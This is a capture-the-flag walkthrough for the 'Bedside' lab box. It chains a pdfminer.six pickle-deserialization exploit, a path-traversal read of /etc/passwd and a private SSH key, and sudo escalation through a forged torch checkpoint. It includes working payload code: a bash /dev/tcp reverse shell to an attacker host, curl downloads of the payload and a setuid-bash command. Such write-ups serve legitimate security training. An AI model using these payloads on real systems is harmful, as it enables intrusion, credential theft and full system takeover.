# Bedside

## Reconnaissance

Command:

````bash
nmap -sV -sC -T4 <target_ip>
````

*Why:* baseline service/version scan to see what's exposed and worth attacking.

The scan reveals SSH (22) and HTTP (80). Port 3000 is filtered — not reachable externally, but worth remembering (it becomes the lateral-movement path).

````text
22/tcp   open     ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp   open     http    Apache httpd 2.4.68
3000/tcp filtered ppp
````

Port 80 redirects to `http://bedside.htb/`, so the site uses name-based virtual hosting. Add the host:

````bash
echo "<target_ip> bedside.htb" | sudo tee -a /etc/hosts
````

*Why:* the vhost is bound to the hostname; the raw IP just issues a redirect and won't serve the real site.

---

## Virtual Host Discovery

The root site is a near-empty landing page, so fuzz for additional vhosts:

````bash
ffuf -u http://bedside.htb/ -H "Host: FUZZ.bedside.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac -t 200
````

*Why:* a box built around a named host often hides the real application on a second vhost; `-ac` auto-calibrates the filter so only distinct responses show.

````text
research                [Status: 200, Size: 3152, Words: 313, Lines: 80]
````

Add it and browse:

````bash
echo "<target_ip> research.bedside.htb" | sudo tee -a /etc/hosts
````

---

## Enumerate the Web Application

`http://research.bedside.htb/` is the "Bedside Research Portal" — a file-upload form for medical imaging and research documents ("Collections can be uploaded as archives"). Inspecting the upload response headers reveals the backend:

````bash
curl -sk -i -F "uploadFile=@test.pdf" http://research.bedside.htb/ | grep -i powered
````

*Why:* a custom processing pipeline is where non-standard code lives; the response header names the library handling uploads.

````text
X-Powered-By: pdfminer.six
````

A Python backend parsing uploaded PDFs with **pdfminer.six** is the lead.

---

## Vulnerability Identification — CVE-2025-64512

pdfminer.six before 20251107 is vulnerable to insecure pickle deserialization: a crafted PDF can point its CMap `/Encoding` at an attacker-controlled `.pickle.gz`, and `CMapDB._load_data()` deserializes it with `pickle.loads()` during parsing — arbitrary code execution.

*Why:* the portal's whole purpose is to ingest and process PDFs, so a parse-time RCE in the parser is the intended foothold.

Reference PoC (official advisory GHSA-wf5f-4jwr-ppcp):

````text
/Encoding points to a path; pdfminer appends ".pickle.gz" and unpickles it.
````

---

## Disclose the Upload Path

Testing archive uploads leaks the accepted extensions via an error message:

````bash
tar cf collection.tar x ; curl -sk -F "uploadFile=@collection.tar" http://research.bedside.htb/ | grep -i message
````

````text
Invalid file type. Allowed: jpeg, jpg, png, bmp, tiff, dcm, pdf, gz, zip
````

*Why:* `.gz` and `.zip` are accepted, so the pickle can be uploaded directly. Uploaded files are also web-reachable, which discloses the directory:

````bash
cp payload.pickle.gz malicious.pickle.gz
curl -sk -F "uploadFile=@malicious.pickle.gz" http://research.bedside.htb/ | grep -i message
curl -sk -o /dev/null -w "%{http_code}\n" http://research.bedside.htb/uploads/malicious.pickle.gz
````

````text
200
````

*Why:* a 200 confirms the pickle is on disk at a known web path. The filesystem path follows the Debian vhost convention: `/var/www/research.bedside.htb/uploads/`.

---

## Foothold — Craft the Malicious Pickle and Trigger PDF

Build a pickle whose `__reduce__` returns a reverse shell, and a PDF whose `/Encoding` points at its absolute on-disk path:

````python
# make_pickle.py
import pickle, gzip, os
LHOST, LPORT = "<attacker_ip>", 8888
class E:
    def __reduce__(self):
        return (os.system, (f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'",))
with gzip.open("malicious.pickle.gz","wb") as f: pickle.dump(E(), f)
````

````bash
python3 make_pickle.py

# trigger PDF: /Encoding = absolute path to the pickle, minus the .pickle.gz suffix
python3 gen_payload.py \
  --path /var/www/research.bedside.htb/uploads/malicious \
  --gz-out /dev/null --pdf-out trigger.pdf -c "echo x"
````

*Why:* the pickle is uploaded as an allowed `.gz`; the PDF only *references* it by path. pdfminer appends `.pickle.gz`, loads it, and the `__reduce__` payload executes.

Start a listener and upload both (pickle first, then PDF):

````bash
nc -lvnp 8888

curl -sk -F "uploadFile=@malicious.pickle.gz" http://research.bedside.htb/ | grep -i message
curl -sk -F "uploadFile=@trigger.pdf"         http://research.bedside.htb/ | grep -i message
````

*Why:* a background watcher polls the upload directory every 30 seconds and runs `pdf2txt.py` on new PDFs — so the shell lands on the watcher's schedule, not instantly. Keep the listener up.

````text
datawrangler@data-wrangler:/app$ id
uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
````

Stabilise:

````bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm
````

---

## Internal Recon

The landing directory `/app` holds the watcher source:

````bash
cat /app/pdf_watcher.py
````

*Why:* the code that processed your PDF reveals the pipeline layout and the shared datastore.

````python
UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
OUTPUT_DIR = "/datastore/staging"
# polls every 30s, runs: pdf2txt.py <pdf> -o <OUTPUT_DIR>/<uuid>.txt
````

The container is minimal (`data-wrangler`, no `ps`, no torch). Enumerate the internal service that was filtered externally:

````bash
curl -s http://127.0.0.1:3000/ | head -40
````

````text
<title>Bedside Clinic - Image Viewer</title>
...
import _ from './vendor/lodash.js';
<script type="module">import createHotContext from"/@hmr"; ... Built with esm.sh/x
````

*Why:* port 3000 is a React "Image Viewer" served by an **esm.sh/x dev server** (note `/@hmr` and HMR) — a dev server that maps URL paths to files on disk, a classic path-traversal surface.

---

## Lateral Movement — Arbitrary File Read on :3000

The esm.sh/x `/@fs/` route serves files by filesystem path. Traverse it to read arbitrary files (use `--path-as-is` so curl does not normalise `../`):

````bash
curl -s --path-as-is "http://127.0.0.1:3000/@fs/../../../../../../etc/passwd"
````

*Why:* the dev server already reads local modules by path (`./vendor/lodash.js`); `/@fs/` with enough `../` escapes the served root to read anything the service user can.

````text
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
````

Target `developer` (uid 1000). Read the private flag and SSH key via the same primitive:

````bash
curl -s --path-as-is "http://127.0.0.1:3000/@fs/../../../../../../home/developer/user.txt"
curl -s --path-as-is "http://127.0.0.1:3000/@fs/../../../../../../home/developer/.ssh/id_ed25519"
````

*Why:* the file read runs in the :3000 service's context, which can read `developer`'s home; the ed25519 key gives a stable, real shell.

Save the key on the attacker box and log in — SSH (22) is exposed on the host:

````bash
chmod 600 id_developer
ssh -i id_developer developer@bedside.htb
````

---

## Retrieve User Flag

````bash
developer@bedside:~$ cat ~/user.txt
````

The user flag is obtained.

---

# Privilege Escalation

## Identify the Sudo Vector

````bash
sudo -l
````

*Why:* first check for a permitted command that runs as root.

````text
User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
````

Read the script:

````bash
cat /opt/trainer/bedside_trainer.py
````

*Why:* the exploit depends entirely on what the root-run script loads.

The script is a MONAI trainer. It loads the newest `.pt` checkpoint from `/datastore/checkpoints/` using MONAI's `CheckpointLoader`, which calls `torch.load()`:

````python
latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)   # /datastore/checkpoints/*.pt
loader = CheckpointLoader(load_path=str(latest_ckpt), load_dict={...})
loader(engine)   # -> torch.load() -> unpickle
````

Confirm the torch version:

````bash
python3 -c "import torch, monai; print(torch.__version__, monai.__version__)"
````

````text
2.5.0+cpu 1.5.0
````

*Why:* torch < 2.6 defaults `torch.load` to `weights_only=False`, so it unpickles freely — no bypass needed. (torch ≥ 2.6 would block this.)

---

## Plant the Malicious Checkpoint (via the datawrangler container)

`developer` cannot read `/datastore`, but it is `drwxrwx--- datawrangler dataops` — writable from the **container** shell. The privesc therefore chains both identities: `datawrangler` (container) plants the checkpoint into the shared datastore, and `developer` (host) triggers the root trainer that loads it.

A `.pt` is a zip containing a pickle at `archive/data.pkl`, so it can be forged without torch:

````python
# build on attacker box (no torch required)
import pickle, zipfile, os
class Exploit:
    def __reduce__(self):
        return (os.system, ("chmod +s /bin/bash",))
payload = pickle.dumps({"model": Exploit()}, protocol=2)
with zipfile.ZipFile("evil.pt","w",zipfile.ZIP_STORED) as z:
    z.writestr("archive/data.pkl", payload)
    z.writestr("archive/version", "3\n")
````

*Why:* `torch.load` opens the zip and unpickles `data.pkl`, firing `__reduce__` as root. `chmod +s /bin/bash` is simpler and more durable than a reverse shell.

From the **datawrangler** container shell, stage the checkpoint and a real image so the trainer reaches the load step (it exits early on no data):

````bash
# serve evil.pt + a valid PNG from the attacker box, then:
curl -s http://<attacker_ip>:8000/evil.pt  -o /datastore/checkpoints/zzz_latest.pt
curl -s http://<attacker_ip>:8000/test.png -o /datastore/staging/seed.png
rm -f /datastore/staging/*.txt /datastore/processed/*.txt 2>/dev/null
touch /datastore/checkpoints/zzz_latest.pt
````

*Why:* `/datastore` is a shared mount between the container and host; the staged image makes `n_data > 0` so the script builds the dataloader and then loads the (newest) checkpoint. Clearing stale `pdf2txt` `.txt` files keeps `LoadImaged` from erroring before the load.

---

## Execute as Root and Dump the Flag

Trigger the trainer as `developer`:

````bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
````

*Why:* the root process loads the forged checkpoint; the pickle executes `chmod +s /bin/bash` as root. (It then raises a harmless `TypeError` because the unpickled value isn't a real state_dict — the command has already run.)

````text
... Found checkpoint /datastore/checkpoints/zzz_latest.pt, loading with CheckpointLoader ...
````

Confirm and drop into a root shell:

````bash
ls -la /bin/bash
/bin/bash -p
id
cat /root/root.txt
````

````text
-rwsr-sr-x 1 root root 1298416 /bin/bash
uid=1000(developer) gid=1000(developer) euid=0(root) ...
````

The root flag is successfully obtained.

---

# Attack Chain

````text
Nmap → vhost research.bedside.htb (port 3000 filtered) →
X-Powered-By: pdfminer.six → CVE-2025-64512 (pickle deserialization in PDF parsing) →
upload pickle.gz + trigger PDF with absolute /Encoding path →
pdf_watcher.py (30s poll, pdf2txt.py) executes pickle → shell as datawrangler (container) →
internal esm.sh/x Image Viewer on 127.0.0.1:3000 → /@fs/ path-traversal arbitrary file read →
leak /etc/passwd + developer's id_ed25519 → SSH as developer (user flag) →
sudo -l: NOPASSWD MONAI trainer that torch.load()s newest /datastore/checkpoints/*.pt (torch 2.5, unsafe unpickle) →
datawrangler (shared /datastore) plants forged .pt → developer triggers trainer as root →
__reduce__ runs chmod +s /bin/bash → bash -p → root flag
````